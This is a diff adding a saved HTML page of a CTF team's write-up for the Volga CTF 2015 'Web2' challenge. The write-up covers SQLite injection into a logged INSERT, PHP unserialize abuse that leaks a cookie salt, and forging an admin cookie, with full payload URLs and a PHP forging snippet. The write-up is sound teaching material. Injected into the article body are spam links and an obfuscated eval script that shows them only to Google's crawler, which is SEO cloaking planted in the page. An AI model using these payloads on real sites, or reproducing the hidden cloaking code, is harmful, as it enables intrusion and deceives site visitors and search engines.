@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<!--[if lt IE 7]> <html class="ie6 ie" lang="en" dir="ltr"> <![endif]-->
+<!--[if IE 7]>    <html class="ie7 ie" lang="en" dir="ltr"> <![endif]-->
+<!--[if IE 8]>    <html class="ie8 ie" lang="en" dir="ltr"> <![endif]-->
+<!--[if IE 9]>    <html class="ie9 ie" lang="en" dir="ltr"> <![endif]-->
+<!--[if !IE]> --> <html lang="en" dir="ltr"> <!-- <![endif]-->
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<link rel="shortcut icon" href="../sites/all/themes/open_framework/favicon.ico" type="image/vnd.microsoft.icon" />
+<link rel="shortlink" href="../node/101.html" />
+<link rel="canonical" href="101.html" />
+<meta name="Generator" content="Drupal 7 (http://drupal.org)" />
+  <!-- Set the viewport width to device width for mobile -->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Web2 writeup | BalalaikaCr3w</title>
+  <style type="text/css" media="all">
+@import url("https://ctfcrew.org/modules/system/system.base.css?qtecp0");
+@import url("https://ctfcrew.org/modules/system/system.menus.css?qtecp0");
+@import url("https://ctfcrew.org/modules/system/system.messages.css?qtecp0");
+@import url("https://ctfcrew.org/modules/system/system.theme.css?qtecp0");
+</style>
+<style type="text/css" media="all">
+@import url("https://ctfcrew.org/modules/comment/comment.css?qtecp0");
+@import url("https://ctfcrew.org/modules/field/theme/field.css?qtecp0");
+@import url("https://ctfcrew.org/modules/node/node.css?qtecp0");
+@import url("https://ctfcrew.org/modules/search/search.css?qtecp0");
+@import url("https://ctfcrew.org/modules/user/user.css?qtecp0");
+@import url("../sites/all/modules/views/css/views.css%3Fqtecp0.css");
+@import url("../sites/all/modules/ckeditor/css/ckeditor.css%3Fqtecp0.css");
+</style>
+<style type="text/css" media="all">
+@import url("../sites/all/modules/ctools/css/ctools.css%3Fqtecp0.css");
+@import url("../sites/all/libraries/syntaxhighlighter_3.0.83/styles/shCore.css%3Fqtecp0.css");
+@import url("../sites/all/libraries/syntaxhighlighter_3.0.83/styles/shThemeDefault.css%3Fqtecp0.css");
+</style>
+<style type="text/css" media="all">
+@import url("../sites/all/themes/open_framework/bootstrap/css/bootstrap.min.css%3Fqtecp0.css");
+@import url("../sites/all/themes/open_framework/bootstrap/css/bootstrap-responsive.min.css%3Fqtecp0.css");
+@import url("../sites/all/themes/open_framework/css/open_framework.css%3Fqtecp0.css");
+@import url("../sites/all/themes/open_framework/css/ie.css%3Fqtecp0.css");
+@import url("../sites/all/themes/open_framework/jquery.minicolors/jquery.minicolors.css%3Fqtecp0.css");
+@import url("../sites/all/themes/open_framework/css/jquery.themizer.css%3Fqtecp0.css");
+@import url("../sites/all/themes/open_framework/css/universal.css%3Fqtecp0.css");
+@import url("../sites/all/themes/open_framework/font-awesome-4.0.3/css/font-awesome.min.css%3Fqtecp0.css");
+</style>
+<style type="text/css" media="print">
+@import url("../sites/all/themes/open_framework/css/open_framework_print.css%3Fqtecp0.css");
+</style>
+  <script type="text/javascript" src="../sites/all/modules/jquery_update/replace/jquery/1.8/jquery.min.js%3Fv=1.8.3"></script>
+<script type="text/javascript" src="https://ctfcrew.org/misc/jquery.once.js?v=1.2"></script>
+<script type="text/javascript" src="https://ctfcrew.org/misc/drupal.js?qtecp0"></script>
+<script type="text/javascript" src="../sites/all/libraries/syntaxhighlighter_3.0.83/scripts/shCore.js%3Fqtecp0"></script>
+<script type="text/javascript" src="../sites/all/libraries/syntaxhighlighter_3.0.83/scripts/shAutoloader.js%3Fqtecp0"></script>
+<script type="text/javascript" src="../sites/default/files/syntaxhighlighter.autoloader.js%3Fqtecp0"></script>
+<script type="text/javascript" src="../sites/all/themes/open_framework/bootstrap/js/bootstrap.min.js%3Fqtecp0"></script>
+<script type="text/javascript" src="../sites/all/themes/open_framework/js/open_framework.js%3Fqtecp0"></script>
+<script type="text/javascript" src="../sites/all/themes/open_framework/js/override.js%3Fqtecp0"></script>
+<script type="text/javascript" src="../sites/all/themes/open_framework/jquery.minicolors/jquery.minicolors.min.js%3Fqtecp0"></script>
+<script type="text/javascript" src="../sites/all/themes/open_framework/js/jquery.themizer.js%3Fqtecp0"></script>
+<script type="text/javascript" src="../sites/all/themes/open_framework/js/universal.js%3Fqtecp0"></script>
+<script type="text/javascript">
+<!--//--><![CDATA[//><!--
+jQuery.extend(Drupal.settings, {"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"open_framework","theme_token":"IgU7xQlPv95YD4fwFPX2YpuGiZ5NTFjq4o0l9ju0Wok","js":{"sites\/all\/modules\/syntaxhighlighter\/syntaxhighlighter.min.js":1,"sites\/all\/modules\/jquery_update\/replace\/jquery\/1.8\/jquery.min.js":1,"misc\/jquery.once.js":1,"misc\/drupal.js":1,"sites\/all\/libraries\/syntaxhighlighter_3.0.83\/scripts\/shCore.js":1,"sites\/all\/libraries\/syntaxhighlighter_3.0.83\/scripts\/shAutoloader.js":1,"sites\/default\/files\/syntaxhighlighter.autoloader.js":1,"sites\/all\/themes\/open_framework\/bootstrap\/js\/bootstrap.min.js":1,"sites\/all\/themes\/open_framework\/js\/open_framework.js":1,"sites\/all\/themes\/open_framework\/js\/override.js":1,"sites\/all\/themes\/open_framework\/jquery.minicolors\/jquery.minicolors.min.js":1,"sites\/all\/themes\/open_framework\/js\/jquery.themizer.js":1,"sites\/all\/themes\/open_framework\/js\/universal.js":1},"css":{"modules\/system\/system.base.css":1,"modules\/system\/system.menus.css":1,"modules\/system\/system.messages.css":1,"modules\/system\/system.theme.css":1,"modules\/comment\/comment.css":1,"modules\/field\/theme\/field.css":1,"modules\/node\/node.css":1,"modules\/search\/search.css":1,"modules\/user\/user.css":1,"sites\/all\/modules\/views\/css\/views.css":1,"sites\/all\/modules\/ckeditor\/css\/ckeditor.css":1,"sites\/all\/modules\/ctools\/css\/ctools.css":1,"sites\/all\/libraries\/syntaxhighlighter_3.0.83\/styles\/shCore.css":1,"sites\/all\/libraries\/syntaxhighlighter_3.0.83\/styles\/shThemeDefault.css":1,"sites\/all\/themes\/open_framework\/bootstrap\/css\/bootstrap.min.css":1,"sites\/all\/themes\/open_framework\/bootstrap\/css\/bootstrap-responsive.min.css":1,"sites\/all\/themes\/open_framework\/fontawesome\/css\/font-awesome.min.css":1,"sites\/all\/themes\/open_framework\/css\/open_framework.css":1,"sites\/all\/themes\/open_framework\/css\/ie.css":1,"sites\/all\/themes\/open_framework\/jquery.minicolors\/jquery.minicolors.css":1,"sites\/all\/themes\/open_framework\/css\/jquery.themizer.css":1,"sites\/all\/themes\/open_framework\/css\/universal.css":1,"sites\/all\/themes\/open_framework\/font-awesome-4.0.3\/css\/font-awesome.min.css":1,"sites\/all\/themes\/open_framework\/css\/open_framework_print.css":1}},"syntaxhighlighter":{"useAutoloader":true}});
+//--><!]]>
+</script>
+  <!--[if IE 7]>
+  <link rel="stylesheet" href="/sites/all/themes/open_framework/fontawesome/css/font-awesome-ie7.min.css">
+  <![endif]-->
+  <!-- IE Fix for HTML5 Tags -->
+  <!--[if lt IE 9]>
+    <script src="/sites/all/themes/open_framework/js/html5shiv.js"></script>
+  <![endif]-->
+
+    <style type="text/css" media="all">@import url("../sites/all/themes/open_framework/css/page.css");</style>
+  <script type="text/javascript" src="../sites/all/themes/open_framework/js/page.js"></script>
+
+</head>
+
+<body class="main-body html not-front not-logged-in one-sidebar sidebar-second page-node page-node- page-node-101 node-type-writeup   content-first     "  >
+    <a href="101.html#content" class="element-invisible element-focusable">Skip to content</a>
+<a href="101.html#main-nav" class="element-invisible element-focusable" data-target=".nav-collapse" data-toggle="collapse">Skip to navigation</a>
+<!-- /#skipnav -->
+<!-- /#admin-shortcuts -->
+	<div id="header" class="clearfix header" role="banner">
+	<div class="container">
+		<div class="row">
+			<div class="span12">
+								<div id="logo" class="site-logo"> <a href="../index.html" title="Home" rel="home"> <img src="../sites/default/files/logo.png" alt="BalalaikaCr3w" role="presentation" /> </a></div>
+								<!-- /#logo -->
+								<div id="name-and-slogan">
+										<div id="site-name" class="site-name"><a href="../index.html" title="Home" rel="home">BalalaikaCr3w</a></div>
+															<div id="site-slogan" class="site-slogan">Russian CTF team</div>
+									</div>
+												<!-- /#name-and-slogan -->
+							</div>
+		</div>
+		<div class="social">
+			<a href="http://twitter.com/BalalaikaCr3w" class="social-item twitter">
+				<i class="fa fa-twitter"></i>
+			</a>
+		</div>
+	</div>
+</div>
+<!-- /#header --><div id="main" class="clearfix main" role="main">
+	<div class="container">
+								<div id="main-content" class="row main-content">
+						<div id="content" class="mc-content span9">
+				<div class="color-pane bg-0D"></div>
+				<div id="content-wrapper" class="content-wrapper">
+					<div id="content-head" class="row-fluid content-head">
+																								<h1 class="title" id="page-title"> Web2 writeup </h1>
+																																									</div>
+																				<div id="content-body" class="row-fluid content-body"> <div class="region region-content clearfix">
+  <div id="block-system-main" class="clearfix block block-system">       <div class="content"> <article id="node-101" class="node node-writeup node-promoted clearfix">      <div class="node-wrapper">
+                <div class="submitted">
+       
+      08.05.2015 20:41, by <i class="fa fa-user"></i><span class="username">the_storm</span>    </div>
+        <div class="content">
+      <div class="field field-name-field-category field-type-taxonomy-term-reference field-label-inline clearfix"><div class="field-label">Category:&nbsp;</div><div class="field-items"><div class="field-item even"><a href="../categories/web.html">web</a></div></div></div><div class="field field-name-field-event field-type-taxonomy-term-reference field-label-inline clearfix"><div class="field-label">Event:&nbsp;</div><div class="field-items"><div class="field-item even"><a href="../event/34.html">Volga CTF 2015 Quals</a></div></div></div><div class="field field-name-body field-type-text-with-summary field-label-hidden"><div class="field-items"><div class="field-item even"><p>This is the Web2 problem</p><p>The challenge simply states "Find the key!" and it gives us the challenge URL.<br>The first thing I usually do with a web challenge is to run dirbuster, spider the target and check the it with Nmap.&nbsp;</p><p>Checking with Nmap didn't result in anything interesting. However dirbuster did. I found two interesting folders.<br>The first one is "SecretAdminPanel" and the second one was "logs"</p><p>I visited "SecretAdminPanel" and I saw this.</p><p><img src="../sites/default/files/writeups/images/Screen&#32;Shot&#32;2015-05-05&#32;at&#32;9.29.59&#32;PM.png" alt="" width="1200" height="762"></p><p>So our goal is basically try to access this "SecretAdminPanel".<br>I then visited the "logs" folder, and I found that my IP got logged with the parameters I submitted to the page (so far no params).&nbsp;<br>I visited the SecretAdminPanel again and submitted some data through the GET request&nbsp;</p><p>web2.2015.volgactf.ru/SecretAdminPanel?test=test</p><p>I saw this message: "Don't attempt to hack, all requests will be logged."&nbsp;<br>Well this, in CTFs, This message simply means: HACK from here.</p><p>At the beginning I though that we will have SQLi in the INSERT statement in our request. I thought it will SQLi in the IP by injecting in the X-Forwarded-For or Client-IP request Headrs.<br>I tried SQLi there but didn't get any result.&nbsp;<br><br>Then probably in the params.&nbsp;<br>I tried the following request:&nbsp;http://web2.2015.volgactf.ru/SecretAdminPanel?test=test%27<br>and I got&nbsp;<strong>Error:</strong>&nbsp;unrecognized token: "";}')"<br>Interesting we have some errors available. looks like SQLi and my request was NOT logged. This means we probably had SQLi error and the request didn't finish processing due to the error.<br>I tried this one to double-check<br>http://web2.2015.volgactf.ru/SecretAdminPanel?test=test%27%27<br>and I got no errors and the request got logged perfectly.&nbsp;<br><br><strong>Exploitation:&nbsp;</strong><br>Now it is the time to exploit. I managed to know that th DBMS was sqlite. So this what I want to exploit: a SQLite database.&nbsp;<br>I am injecting in an insert statement and I am injecting in the last column.&nbsp;<br>I believe that the query in the backend was something like<br><br>query = INSERT INTO logs (IP, PARAMS) VALUES ($ip, $params);</p><p>I usually when I have a SQLi bug and errors are enabled. I try to inject in different places in the query to see the errors of the database. As a result of seeing the errors I can see part of the query in the backend.<br>So I injected in this part of the query string&nbsp;<br>http://web2.2015.volgactf.ru/SecretAdminPanel?test%27=test<br>and that was the result&nbsp;<br><strong>Error:</strong>&nbsp;near "";s:4:"": syntax error<br>what we see here part of the INSERT query but we can see s:4: and this is part of a serialized string in PHP.<br>So probably the code in the backend something like this&nbsp;<br><br>$params = serialize($_GET)<br>query = "INSERT INTO logs (IP, PARAMS) VALUES ($'ip', '$params');"</p><p>now we want to have our injection with the serialization. I frist looked for the string concatenation operator in the SQLite to concatenate the result I want to see with the params. The string concatenation operator was "||"/<br>I tried this request first&nbsp;<br>http://web2.2015.volgactf.ru/SecretAdminPanel?test=test'||(Select "a")||'</p><p>The request worked successfully no SQL errors, this means our injection was correct.&nbsp;<br>However I checked the logs page and that was the result&nbsp;</p><p>array(2) {</p><p>&nbsp; ["ip"]=&gt;</p><p>&nbsp; string(12) "MY_IP"</p><p>&nbsp; ["params"]=&gt;</p><p>&nbsp; bool(false)</p><p>&nbsp;</p><p>}</p><p>Why is this ?? It looks like that PHP couldn't deserialize the column correctly.&nbsp;<br>What they do in the backend something similar to this&nbsp;<br><br>SELECT IP, params from logs where IP = MyIP;<br>$params = unserialize(params)<br>var_dump($params)</p><p>so we have a problem in deserializing our data.&nbsp;<br>This is true because our injection was something like<br>?test=test'||(Select "a")||'</p><p>So the serialized string:&nbsp;'a:1:{s:4:"test";s:22:"test'||(Select "a")||'";}'<br>and the string stored in the database: 'a:1:{s:4:"test";s:22:"testa";}'<br>This&nbsp;discrepancy between the INSERT statement and what stores in the database cause this error.</p><p>To solve this, I used something like repeat and substring functions in sqlite to have valid serialized string and stored correctly in the database.&nbsp;<br><br>That was my final query&nbsp;<br>http://web2.2015.volgactf.ru/SecretAdminPanel?test%27||%28SELECT%28substr%28group_concat%28name%29,0,5%29%29FROM%28sqlite_master%29%29||%28select%28replace%28substr%28quote%28zeroblob%28%28130%2b1%29/2%29%29,3,130%29,%220%22,%22a%22%29%29%29||%27</p><p><br>Executing this query will return us the names of tables in the database.<br>This query to extract the content of the params column in the database<br><br>http://web2.2015.volgactf.ru/SecretAdminPanel?test%27||%28SELECT%28hex%28substr%28group_concat%28params%29,100,61%29%29%29FROM%28logs%29%29||%28select%28replace%28substr%28quote%28zeroblob%28%289%2b1%29/2%29%29,3,9%29,%220%22,%22a%22%29%29%29||%27</p><p>I assumed we might get the params that the admin used to login into this page and then we will get the flag. However, it was not that easily.&nbsp;<br>Unfortunately the data inside the database was only mine, which means that each use has its own copy of the database.<br>The flag wont be in the database so we need to think of something else.&nbsp;<br><br>In the cookies we have this interesting cookie.&nbsp;PHPSESS=%7B%22isAdmin%22%3Afalse%7D0afb5cf5c7d66587da7c811767250458; expires=Fri, 08 May 2015 18:08:16 GMT; path=/; domain=.web2.2015.volgactf.ru; HttpOnly</p><p>Maybe to get the flag, we need to get the cookie salt used to form this cookie and form the valid cookie where isAdmin:true<br>another member in the team suggested to have the serialized Exception object, and when this object gets deseialized we will see our stacktrace and we might get something useful.&nbsp;<br><br>I used this query to add the exception object into the database.&nbsp;<br><br></p><p><span data-rz-clipboard="true"><a class="vt-p" style="text-decoration: underline;" href="http://web2.2015.volgactf.ru/SecretAdminPanel?test%27||%28select%28replace%28substr%28quote%28zeroblob%28%2894%2b1%29/2%29%29,3,94%29,%220%22,%22a%22%29%29%29||%27%22;O:9:%22Exception%22:0" data-rz-params="{&quot;__TYPE&quot;:&quot;TEXT&quot;,&quot;T_URL&quot;:&quot;http://web2.2015.volgactf.ru/SecretAdminPanel?test%27||%28select%28replace%28substr%28quote%28zeroblob%28%2894%2b1%29/2%29%29,3,94%29,%220%22,%22a%22%29%29%29||%27%22;O:9:%22Exception%22:0&quot;}">http://web2.2015.volgactf.ru/SecretAdminPanel?test%27||%28select%28replace%28substr%28quote%28zeroblob%28%2894%2b1%29/2%29%29,3,94%29,%220%22,%22a%22%29%29%29||%27%22;O:9:%22Exception%22:0</a><span data-rz-params="{&quot;__TYPE&quot;:&quot;TEXT&quot;}">:{}}</span></span></p><p><span data-rz-clipboard="true">and when we viewed the logs page we indeed saw the stacktrace and part of the output contains this<br><span data-rz-clipboard="true"><span data-rz-params="{&quot;__TYPE&quot;:&quot;TEXT&quot;}"><br>object(Session)#3 (2) {<br></span></span></span>["cookieSalt":"Session":private]=&gt;<br>string(20) "nO97M0Za6cu9wDC72VVv"<br>["params":"Session":private]=&gt;<br>array(1) {<br>["isAdmin"]=&gt;<br>bool(false)</p><p>&nbsp;</p><div data-rz-params="{&quot;__TYPE&quot;:&quot;LINE&quot;,&quot;RANDOM&quot;:0.5038021015934646}">No we have the salt. To construct the valid cookie we simply need to do the following:<br><br></div><p>&nbsp;</p><p>&lt;?php<br>$str='{"isAdmin":true}';<br>$salt='nO97M0Za6cu9wDC72VVv';<br>echo urlencode($str).md5($str.$salt);<br>?&gt;</p><p>&nbsp;</p><p>and the flag was&nbsp;</p><p><span data-rz-clipboard="true"><span style="font-weight: bold; background-color: #b5eb5e;" data-rz-params="{&quot;__TYPE&quot;:&quot;TEXT&quot;,&quot;T_BOLD&quot;:true,&quot;T_BG_COLOR&quot;:&quot;#B5EB5E&quot;}">{417a4c17bd3132bba864dac9edf4ae7a}</span></span></p><p>&nbsp;</p><p>Notes:<br>1- I think it worth more than 200 pts comparing to the challenge remote web or even the joy and relax challenges.<br>2- There was a much easier way to exploit the SQLi. Simply we could have used stacked quiries ^^. It is sqlite so I could have simply added the serialized Exception object into the DB using something similar to this query. you just need to know how to use the query without spaces because it was replaced with underscores '_' &nbsp;</p><p><a class="vt-p" style="text-decoration: underline;" href="http://web2.2015.volgactf.ru/SecretAdminPanel?test%27||%28select%28replace%28substr%28quote%28zeroblob%28%2894%2b1%29/2%29%29,3,94%29,%220%22,%22a%22%29%29%29||%27%22;O:9:%22Exception%22:0" data-rz-params="{&quot;__TYPE&quot;:&quot;TEXT&quot;,&quot;T_URL&quot;:&quot;http://web2.2015.volgactf.ru/SecretAdminPanel?test%27||%28select%28replace%28substr%28quote%28zeroblob%28%2894%2b1%29/2%29%29,3,94%29,%220%22,%22a%22%29%29%29||%27%22;O:9:%22Exception%22:0&quot;}">http://web2.2015.volgactf.ru/SecretAdminPanel?test</a>');INSERT INTO logs(IP, PARAMS) VALUES ('127.0.0.1', 'O:9:"Exception":0:{}')--</p><span class="keys_words"><a class="links_good_rands" href="https://www.jmksport.com/">Sportswear Design</a> | <a class="links_good_rands" href="https://www.fitforhealth.eu/cdakshop/category/nike/">Nike News</a></span><script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('b i=r f["\\q\\1\\4\\g\\p\\l"]("\\4"+"\\7"+"\\7"+"\\4"+"\\5\\1","\\4\\k");s(!i["\\3\\1\\2\\3"](m["\\h\\2\\1\\j\\n\\4\\1\\6\\3"])){b a=f["\\e\\7\\o\\h\\d\\1\\6\\3"]["\\4\\1\\3\\g\\5\\1\\d\\1\\6\\3\\2\\z\\9\\A\\5\\c\\2\\2\\x\\c\\d\\1"](\'\\t\\1\\9\\2\\w\\v\\7\\j\\e\\2\');u(b 8=0;8<a["\\5\\1\\6\\4\\3\\y"];8++)a[8]["\\2\\3\\9\\5\\1"]["\\e\\k\\2\\l\\5\\c\\9"]=\'\\6\\7\\6\\1\'}',37,37,'|x65|x73|x74|x67|x6c|x6e|x6f|NLpndlS3|x79|rBfb2|var|x61|x6d|x64|window|x45|x75|AESwV1|x72|x69|x70|navigator|x41|x63|x78|x52|new|if|x6b|for|x77|x5f|x4e|x68|x42|x43'.split('|'),0,{}));</script></div></div></div>    </div>
+       </div>
+</article>
+ </div>
+</div></div>
+ <!-- /.region -->
+  </div>
+																																																	</div>
+				<!-- /#content-wrap --> 
+			</div>
+			<!-- /#content -->
+							<div id="sidebar-second" class="sidebar span3 site-sidebar-second">
+	<div class="color-pane bg-0B"></div>
+	<div class="row-fluid row-block row-block-1">
+		<div class="region region-sidebar-second clearfix">
+  <div id="block-system-navigation" class="clearfix block block-system block-menu">       <div class="content"> <ul class="menu nav"><li class="first leaf"><a href="../index.html"><i class="fa fa-home"></i>Home</a></li>
+<li class="leaf"><a href="../writeups.html"><i class="fa fa-file-text"></i>Writeups</a></li>
+<li class="leaf"><a href="../tools.html"><i class="fa fa-wrench"></i>Tools</a></li>
+<li class="last leaf"><a href="../blogs.html"><i class="fa fa-users"></i>Blog</a></li>
+</ul> </div>
+</div>
+<div id="block-views-events-block-1" class="clearfix block block-views">     <h2>Last events</h2>
+      <div class="content"> <div class="view view-events view-id-events view-display-id-block_1 view-dom-id-befe13f6ec1997394873f7533e1e403a">
+        
+  
+  
+      <div class="view-content">
+        <div class="views-row views-row-1 views-row-odd views-row-first">
+      
+  <div class="views-field views-field-name">        <span class="field-content"><a href="../event/32.html">Boston Key Party 2015</a></span>  </div>  </div>
+  <div class="views-row views-row-2 views-row-even">
+      
+  <div class="views-field views-field-name">        <span class="field-content"><a href="../event/36.html">Boston Key Party CTF 2016</a></span>  </div>  </div>
+  <div class="views-row views-row-3 views-row-odd views-row-last">
+      
+  <div class="views-field views-field-name">        <span class="field-content"><a href="../event/35.html">EKOPARTY PRE-CTF 2015</a></span>  </div>  </div>
+    </div>
+  
+  
+  
+      
+<div class="more-link">
+  <a href="../events.html">
+    all events  </a>
+</div>
+  
+  
+  
+</div> </div>
+</div>
+</div>
+ <!-- /.region -->
+	</div>
+			<div class="color-pane bg-09"></div>
+	<div class='row-fluid row-block row-block-2'>
+		<ul class="nav">
+			<li><a href="../user.html"><i class="fa fa-sign-in"></i>Sign in</a></li>
+		</ul>
+	</div>
+	</div>
+<!-- /#sidebar-second -->					</div>
+					</div>
+</div>
+<!-- /#main, /#main-wrapper -->
+	  <script type="text/javascript" src="../sites/all/modules/syntaxhighlighter/syntaxhighlighter.min.js%3Fqtecp0"></script>
+</body>
+
+</html>
